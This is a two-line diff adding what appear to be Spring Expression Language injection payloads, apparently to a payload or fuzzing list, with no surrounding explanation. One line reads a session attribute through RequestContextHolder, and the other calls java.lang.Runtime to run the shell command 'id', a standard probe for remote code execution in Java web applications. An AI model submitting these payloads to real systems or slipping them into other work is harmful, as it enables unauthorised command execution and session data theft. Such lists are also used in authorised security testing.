@@ -1,0 +1,2 @@
+T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getSession(true).getAttribute("<session-flag>")
+T(java.lang.Runtime).getRuntime().exec('id')
